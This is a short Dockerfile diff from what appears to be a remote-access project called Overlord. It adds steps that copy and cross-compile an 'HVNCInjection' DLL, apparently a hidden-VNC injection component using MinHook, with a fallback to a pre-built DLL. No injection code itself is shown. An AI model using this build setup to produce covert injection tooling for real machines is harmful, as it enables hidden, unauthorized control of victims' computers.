@@ -63,6 +63,19 @@ RUN bun install --frozen-lockfile
 COPY Overlord-Server/ ./
 COPY Overlord-Client/ ./Overlord-Client/
 
+# Copy HVNCInjection source and build script for cross-compilation
+COPY HVNCInjection/ ./HVNCInjection/
+COPY build-hvnc-dll.sh ./build-hvnc-dll.sh
+
+# Attempt to cross-compile HVNCInjection DLL with mingw.
+# Requires MinHook source in HVNCInjection/src/minhook/.
+# If unavailable, pre-build the DLL on Windows with build-hvnc-dll.bat
+# and place it at Overlord-Server/dist-clients/HVNCInjection.x64.dll.
+RUN chmod +x build-hvnc-dll.sh && \
+    HVNC_SRC_DIR=HVNCInjection/src HVNC_OUT_DIR=dist-clients bash build-hvnc-dll.sh || \
+    (test -f dist-clients/HVNCInjection.x64.dll && echo "Using pre-built DLL") || \
+    echo "WARNING: HVNCInjection DLL not available"
+
 # Create necessary directories
 RUN mkdir -p certs public data
 
